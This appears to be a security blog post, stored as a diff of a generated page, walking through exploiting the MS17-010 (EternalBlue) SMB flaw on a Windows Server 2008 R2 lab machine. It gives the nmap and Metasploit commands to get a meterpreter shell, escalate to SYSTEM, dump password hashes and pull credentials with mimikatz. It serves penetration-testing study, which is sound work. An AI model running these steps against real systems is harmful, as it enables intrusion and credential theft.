@@ -1,0 +1,73 @@
+I"�<h2 id="how-to-use-the-nmap-scripting-engine-to-test-for-smb-vulnerabilities">How to use the Nmap Scripting Engine to test for SMB vulnerabilities:</h2>
+
+<p>Run <code class="highlighter-rouge">nmap --script  vuln -p139,445 192.168.0.18</code> from your terminal. Change 192.168.0.18 to your target’s IP address.</p>
+
+<p><img src="../assets/nmap/nmap1.jpg" alt="example command" /></p>
+
+<p>The result is <code class="highlighter-rouge">Vulnerable</code> to ms17-010 or CVE-2017-0143 - AKA EternalBlue which was used by the WannaCry ransomware. This exploit allows an attacker to gain full control of a server/computer hosting a share using SMBv1.</p>
+
+<h2 id="exploiting-the-found-vulnerability-ms17-010">Exploiting the found vulnerability (ms17-010):</h2>
+
+<p>Open metasploit <code class="highlighter-rouge">msfconsole</code>
+type <code class="highlighter-rouge">search ms17-010</code></p>
+
+<p><img src="../assets/nmap/msfconsole.jpg" alt="" /></p>
+
+<p>As you can see, there are a few modules found. 
+Let’s confirm our nmap finding with the metasploit scanner:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`use scanner/smb/smb_ms17_010`
+
+`set rhosts 192.168.0.18` - change 192.168.0.18 to your target's IP address. 
+
+`run`
+</code></pre></div></div>
+
+<p><img src="../assets/nmap/smbms17010.png" alt="" /></p>
+
+<p>We have now confirmed the machine is vulnerable and that it is a Windows Server 2008 R2.<br />
+If we go back to our list of modules, Metasploit has a few exploits available.</p>
+
+<p><img src="../assets/nmap/msfconsole.jpg" alt="" /></p>
+
+<p>I tried All and <code class="highlighter-rouge">ms17_010_psexec</code> was the only successful one. The other were not compatible or immediately bluescreened the server.</p>
+
+<p><img src="../assets/nmap/disconnect.png" alt="" /></p>
+
+<p>To use this exploit, type:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`use windows/smb/ms17_010_psexec` hit enter
+
+`set LPORT 4445` switch to whatever you want. This is the port where you will be listening for the meterpreter connection. 
+
+`exploit`
+</code></pre></div></div>
+
+<p><img src="../assets/nmap/shell.png" alt="" /></p>
+
+<p>We got a shell on the remote system.</p>
+
+<p>From here you can escalate privileges if necessary:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`getuid` - if you are not SYSTEM run `getsystem`
+</code></pre></div></div>
+
+<p>If successful, then you can do <code class="highlighter-rouge">run smart_hashdump</code> and get all users and their password hashes. Metasploit automatically saves them to /root/.msf4/loot/ where you can crack them later.</p>
+
+<p><img src="../assets/nmap/smart_hashdump.png" alt="" /></p>
+
+<p>You can also run mimikatz at this point:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`use kiwi`
+`creds_all`
+</code></pre></div></div>
+
+<p><img src="../assets/nmap/credskiwi.png" alt="" /></p>
+
+<p>When I tried creds_msv the server crashed.</p>
+
+<p><img src="../assets/nmap/creds_msvcrash.png" alt="" /></p>
+
+<p>I will be creating another blog post on mitigating this vulnerability and a  memory digital forensics analysis using Volatility for this server.</p>
+
+:ET
